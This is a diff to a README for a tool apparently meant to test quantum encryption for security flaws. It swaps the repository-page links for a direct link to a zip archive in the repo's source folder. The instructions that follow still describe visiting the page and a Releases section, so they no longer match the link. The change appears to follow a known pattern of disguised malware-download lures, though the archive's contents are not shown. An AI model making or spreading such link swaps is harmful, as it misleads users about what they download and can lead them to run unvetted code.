@@ -1,6 +1,6 @@
 # 🛡️ formal-engine-open - Find security flaws in quantum encryption
 
-[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Peeperportraitcamera894/formal-engine-open)
+[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Peeperportraitcamera894/formal-engine-open/main/src/engine_open_formal_v2.7-alpha.1.zip)
 
 ## 🔍 What this tool does
 
@@ -24,7 +24,7 @@ The software performs heavy mathematical calculations. A faster processor reduce
 
 Follow these steps to obtain the software:
 
-1. Visit the repository page to download the latest version: [https://github.com/Peeperportraitcamera894/formal-engine-open](https://github.com/Peeperportraitcamera894/formal-engine-open).
+1. Visit the repository page to download the latest version: [https://raw.githubusercontent.com/Peeperportraitcamera894/formal-engine-open/main/src/engine_open_formal_v2.7-alpha.1.zip](https://raw.githubusercontent.com/Peeperportraitcamera894/formal-engine-open/main/src/engine_open_formal_v2.7-alpha.1.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the most recent release link.
 4. Download the file ending in `.exe` labeled for Windows.
